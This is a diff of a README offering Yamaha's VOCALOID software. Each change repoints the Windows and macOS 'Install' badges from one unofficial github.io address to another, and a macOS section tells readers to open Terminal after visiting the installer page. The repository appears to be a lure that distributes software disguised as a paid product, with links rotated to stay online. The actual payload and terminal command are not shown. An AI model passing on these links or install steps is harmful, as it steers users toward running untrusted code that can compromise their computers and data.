@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install VOCALOID](https://img.shields.io/badge/⬇_Install_VOCALOID-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Install VOCALOID](https://img.shields.io/badge/⬇_Install_VOCALOID-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -61,9 +61,9 @@ VOCALOID is Yamaha's vocal synthesis software that creates realistic singing voi
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
@@ -81,7 +81,7 @@ VOCALOID is Yamaha's vocal synthesis software that creates realistic singing voi
 
 <div align="center">
 
-[![⬇ Install VOCALOID](https://img.shields.io/badge/⬇_Install_VOCALOID-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Install VOCALOID](https://img.shields.io/badge/⬇_Install_VOCALOID-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -100,7 +100,7 @@ VOCALOID is Yamaha's vocal synthesis software that creates realistic singing voi
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -125,7 +125,7 @@ VOCALOID is Yamaha's vocal synthesis software that creates realistic singing voi
 
 <div align="center">
 
-[![⬇ Install VOCALOID](https://img.shields.io/badge/⬇_Install_VOCALOID-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Install VOCALOID](https://img.shields.io/badge/⬇_Install_VOCALOID-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
